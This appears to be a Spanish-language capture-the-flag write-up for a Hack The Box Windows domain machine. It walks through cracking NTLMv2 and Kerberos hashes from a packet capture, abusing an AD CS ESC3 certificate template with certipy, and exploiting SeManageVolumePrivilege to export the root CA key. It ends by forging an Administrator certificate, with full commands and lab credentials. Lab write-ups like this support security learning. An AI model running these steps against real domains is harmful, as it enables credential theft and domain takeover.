el .pcap con Wireshark Una vez abrimos el archivo .pcap con Wireshark , vemos muchos tipos de protocolos que esta vez no nos interesan.\nNosotros estamos buscando las comunicaciones de autenticaci√≥n NTLM que hayan dentro del archivo, con lo cual filtramos por el protcolo NTLMSSP.\nY ya r√°pidamente observamos lo que ser√≠a el paquete de autenticaci√≥n (AUTH) dentro de una Session Setup Request de SMB2\nFlujode paquetes NTLM dentro de SMB/SMB2 Antes de seguir con el pentest, me parece interesante entender que tenemos enfrente. Para ello vamos a explicar paso a paso que significa cada paquete que hemos visto en el archivo.\nConstruir HASH NTLMv2 Ahora que ya sabemos lo que esta ocurriendo en los paquetes, vamos a proceder con los requisitos.\nNT Proof son los primeros 16bytes (32 hex) de la respuesta NTLM en el paquete AUTH.\nNTLMv2 Bloof es el resto de la respuesta NTLM en el paquete AUTH.\nUsername Domain Server_Challenge NT_proof NTLMv2_bloof Administrator WS-01 0f18018782d74f81 16bytes NTLM response Resto del NTLM response # Hash Administrator::WS-01:0f18018782d74f81:3ff29ba4b51e86ed1065c438b6713f28:01010000000000000588e3da922edb012a49d5aaa4eeea0c00000000020016004300450052005400490046004900430041005400450001000800440043003000310004001e00630065007200740069006600690063006100740065002e Y ahora tratamos de crackear el hash NTLMv2 para ver la contrase√±a de administrador local de la workstation WS-01. \u0026quot;chido\u0026quot;..*7¬°Vamos!\nLuego pruebo las credenciales con todos los usuarios del sistema, pero ninguna parece coincidir.\nnxc smb 10.10.11.71 -u users -p password Kerberos autentication - Krb5RoastParser Hasta el momento no hemos conseguido nada con los hash NTLMv2 pero sabemos que hay otras formas de autenticaci√≥n en el sistema.\nKrb5RoastParser Github\nAs√≠ que usando este repositorio vamos a encontrar paquetes y los hashes de la autenticaci√≥n mediante kerberos.\nTenemos tres tipos de hash que podemos encontrar seg√∫n la opci√≥n que indiquemos en el comando:\nHash Descripci√≥n AS-REQ Pre-Auth Roasting AS-REP AS-REP Roasting TGS-REP Kerberoasting (Tickets de servicio) python krb5_roast_parser.py ../WS-01_PktMon.pcap as_req python krb5_roast_parser.py ../WS-01_PktMon.pcap as_rep python krb5_roast_parser.py ../WS-01_PktMon.pcap tgs_rep Y ahora probamos a crackear los diferentes hashes. En este caso en el AS-REP obtenemos las credenciales para el usuario Lion.K:!QAZ2wsx.\nhashcat -m 19900 as_req_hash /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt Comprobamos las credenciales y encontramos la user flag en el escritorio del usuario Lion.K\nnxc smb 10.10.11.71 -u Lion.SK -p \u0026#39;!QAZ2wsx\u0026#39; evil-winrm -i 10.10.11.71 -u Lion.SK -p \u0026#39;!QAZ2wsx\u0026#39; Bloodhound Enumeration Haciendo uso de bloodhound-python, recogemos toda la informaci√≥n disponible en el dominio para luego con BloodhoundCE analizarlo.\nbloodhound-python -u Lion.SK -p \u0026#39;!QAZ2wsx\u0026#39; -d certificate.htb -ns 10.10.11.71 -c all --zip Vemos que pertenece a varios grupos aunque nos interesa el grupo DOMAIN CRA MANAGERS, el cual tiene que ver con AD CS.\nThe members of this security group are responsible for issuing and revoking multiple certificates for the domain users\nEntonces vamos a tratar con certipy buscar plantillas de certificados vulnerables, pero antes vamos a solicitar un TGT (Ticket Garanting Ticket) para autenticar-nos a trav√©s de kerberos con el usuario Lion y a configurar nuestro archivo krb5.conf.\nESC3: Enrollment Agent Certificate Template Ahora haciendo uso de certipy buscamos plantillas vulnerables con -vulnerable.\ncertipy find -k -dc-host DC01.certificate.htb -vulnerable -stdout Vemos que la plantilla de certificados Delegated-CRA, es vulnerable a ESC3. Y que adem√°s tiene el Enrollment Agent True.\nEsc3 Enrollment Agent Template\nPero para conseguir llegar a cabo este vector de ataque, necesitamos otro Template que sea de Client Authentication y que este habilitado.\nSi volvemos a tirar el certipy pero esta vez sin el comando -vulnerable. Vemos todas las plantillas disponibles, y enumerando-las manualmente vemos que el Template SignedUser es vulnerable a ESC3 ya que esta habilitado y tiene el Client Authentication: True, adem√°s nos encontramos con el siguiente mensaje:\nThis is not a vulnerability by itself. See the wiki for more details. Template requires a signature with the Certificate Request Agent application policy\nY como nosotros tenemos la otra plantilla vulnerable a Enrollment Agent, podemos llevar a cabo el ataque ESC3.\ncertipy find -k -dc-host DC01.certificate.htb -stdout Entonces empezamos el ataque solicitando un certificado de Enrollment Agent para nuestro usuario actual con el siguiente comando:\ncertipy req -k -dc-host DC01.certificate.htb -ca Certificate-LTD-CA -template DELEGATED-CRA Una vez con el certificado para nuestro usuario vamos a solicitar otro impersonando al usuario Ryan.K, ya que cuando lo intentabamos con Administrator no nos ha sido posible.\ncertipy find -k -dc-host DC01.certificate.htb -template SignedUser -pfc lion.sk.pfx -on-behalf-of \u0026#39;certificate\\ryan.k\u0026#39; Y vemos que esta vez hemos podido obtener el archivo .pfx de ryan.k . Con lo cual, el siguiente paso es solicitar un TGT de Kerberos con certipy auth.\ncertipy auth -pfx \u0026#39;ryan.k.pfx -dc-ip \u0026#39;10.10.11.71\u0026#39; Procedo a comprobar las credenciales:\nnxc smb certificate.htb --use-kcache Enumerando permisos del grupo Domain Storage Managers. Ahora si volvemos a mirar el bloodhound del usuario Ryan.K, vemos que pertenece a un grupo interesante llamado Domain Storage Managers.\nThe members of this security group are responsible for volume-level tasks such as maintaining, defragmenting and managing partitions and disks.\nIniciamos una shell como el usuario ryan.k haciendo uso de evil-winrm y del hash obtenido anteriormente.\nevil-winrm -i 10.10.11.71 -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6 Explotando el privilegio SeManageVolume Si miramos los permisos con el siguiente comando, observamos que tenemos el privilegio SeManageVolumePrivilege que permite ejecutar operaciones directas sobre vol√∫menes, incluyendo leer sectores en bruto del disco.\nwhoami /priv Buscando por internet, encuentro un exploit para aprovechar el permiso SeManageVolumePrivilege .\nHTB PivotAPI more\nSeManageVolumeAbuse Github\nEntonces lo subimos compilado a la maquina victima usando la utilidad upload de evil-winrm.\nupload SeManageVolumeExploit.exe Y ahora ejecutamos el .exe y vemos que todo funciona correctamente.\nEnumerar y exportar certificados de ryan.k - Certutil Y si ahora miramos los certificados de nuestro usuario con certutil , vemos que tenemos varios certificados interesantes como Root Certification Authority.\nLa Root Certification Authority (CA Ra√≠z) es la m√°xima autoridad de confianza en una jerarqu√≠a Public Key Infrastructure (PKI), y con la cual podemos exportar un archivo .pfx que nos permitir√° generar un certificado para Administrador.\ncertutil -Store My Entonces, el siguiente paso es con certutil exportar el certificado a un archivo .pfx usando la opci√≥n -exportPFX .\ncertutil -exportPFX My 75b2f4bbf31f108945147b466131bdca rootcert.pfx En el caso de que intentemos exportar el certificado sin haber ejecutado el exploit anterior nos dar√° el siguiente error:\nY esto ocurre ya que no tenemos la capacidad de acceder a la clave privada ya que no se encuentra en nuestro almac√©n personal, sino en alg√∫n otro lugar del sistema al que no podemos acceder con un usuario no privilegiado.\nAhora con el certificado ya en nuestro poder, nos lo descargamos a nuestra m√°quina atacante:\ndownload cert.pfx Solicitar certificado de Administrador - Certipy Forge Ahora con la opci√≥n Forge de Certipy, vamos a crear un certificado .pfx como administrador haciendo uso de la Root CA.\ncertipy forge -ca-pfx cert.pfx -upn Administrator@certificate.hbt -sid \u0026lt;sid\u0026gt; Ahora con certipy auth solicitamos un TGT y obtenemos el HASH de Administrator.\ncertipy auth -pfx \u0026#39;administrator_forged.pfx\u0026#39; -dc-ip \u0026#39;10.10.11.71\u0026#39; Y ahora haciendo PassTheHash iniciamos sesi√≥n como administrador en el dominio a trav√©s de Evil-Winrm.\n","permalink":"https://borhuub.github.io/writeups/certificate/","summary":"\u003cp\u003e\u003cimg alt=\"Certificate Machine\" loading=\"lazy\" src=\"/img/certificate/certificate_machine.png\"\u003e\u003c/p\u003e\n\u003ch1 id=\"reconocimiento-en-red\"\u003eReconocimiento en red\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚ùØ sudo nmap -p- --open -sS --min-rate \u003cspan class=\"m\"\u003e5000\u003c/span\u003e -vvv -n -Pn 10.10.11.71 -oG ports\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003esudo\u003cspan class=\"o\"\u003e]\u003c/span\u003e contrase√±a para borhub:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLo siento, pruebe otra vez.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003esudo\u003cspan class=\"o\"\u003e]\u003c/span\u003e contrase√±a para borhub:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost discovery disabled \u003cspan class=\"o\"\u003e(\u003c/span\u003e-Pn\u003cspan class=\"o\"\u003e)\u003c/span\u003e. All addresses will be marked \u003cspan class=\"s1\"\u003e\u0026#39;up\u0026#39;\u003c/span\u003e and scan \u003cspan class=\"nb\"\u003etimes\u003c/span\u003e may be slower.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting Nmap 7.97 \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2025-08-19 19:40 +0200\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eInitiating SYN Stealth Scan at 19:40\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eScanning 10.10.11.71 \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"m\"\u003e65535\u003c/span\u003e ports\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 80/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 445/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 53/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 135/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 139/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49666/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49712/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49687/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 636/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49706/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 593/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49685/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49731/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 9389/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 88/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 464/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49686/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 3268/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 3269/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 389/tcp on 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCompleted SYN Stealth Scan at 19:41, 26.35s elapsed \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e65535\u003c/span\u003e total ports\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up, received user-set \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.037s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eScanned at 2025-08-19 19:40:55 CEST \u003cspan class=\"k\"\u003efor\u003c/span\u003e 26s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNot shown: \u003cspan class=\"m\"\u003e65515\u003c/span\u003e filtered tcp ports \u003cspan class=\"o\"\u003e(\u003c/span\u003eno-response\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT      STATE SERVICE          REASON\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp    open  domain           syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp    open  http             syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp    open  kerberos-sec     syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp   open  msrpc            syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;strong\u0026gt;139/tcp   open  netbios-ssn      syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/strong\u0026gt;389/tcp   open  ldap             syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp   open  microsoft-ds     syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp   open  kpasswd5         syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp   open  http-rpc-epmap   syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp   open  ldapssl          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp  open  globalcatLDAP    syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp  open  globalcatLDAPssl syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e9389/tcp  open  adws             syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49666/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49685/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49686/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49687/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49706/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49712/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49731/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRead data files from: /usr/bin/../share/nmap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap \u003cspan class=\"k\"\u003edone\u003c/span\u003e: \u003cspan class=\"m\"\u003e1\u003c/span\u003e IP address \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e host up\u003cspan class=\"o\"\u003e)\u003c/span\u003e scanned in 26.41 seconds\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e           Raw packets sent: \u003cspan class=\"m\"\u003e131063\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e5.767MB\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e Rcvd: \u003cspan class=\"m\"\u003e30\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e1.320KB\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚ùØ ports.py ports\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eüîç Puertos encontrados:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e53\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e80\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e88\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e135\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e139\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e389\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e445\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e464\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e593\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e636\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e3268\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e3269\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e9389\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e49666\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e49685\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e49686\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e49687\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e49706\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e49712\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e49731\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e¬°Puertos copiados en el portapapeles!\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚ùØ sudo nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49666,49685,49686,49687,49706,49712,49731 10.10.11.71 -oN targeted\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting Nmap 7.97 \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2025-08-19 19:42 +0200\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e 10.10.11.71\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.12s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT      STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp    open  domain        Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp    open  http          Apache httpd 2.4.58 \u003cspan class=\"o\"\u003e(\u003c/span\u003eOpenSSL/3.1.3 PHP/8.0.30\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Did not follow redirect to http://certificate.htb/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Apache/2.4.58 \u003cspan class=\"o\"\u003e(\u003c/span\u003eWin64\u003cspan class=\"o\"\u003e)\u003c/span\u003e OpenSSL/3.1.3 PHP/8.0.30\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp    open  kerberos-sec  Microsoft Windows Kerberos \u003cspan class=\"o\"\u003e(\u003c/span\u003eserver time: 2025-08-20 01:41:57Z\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp   open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp   open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: certificate.htb0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2025-08-20T01:43:28+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e +7h59m38s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC01.certificate.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"c1\"\u003e#x3C;unsupported\u0026gt;, 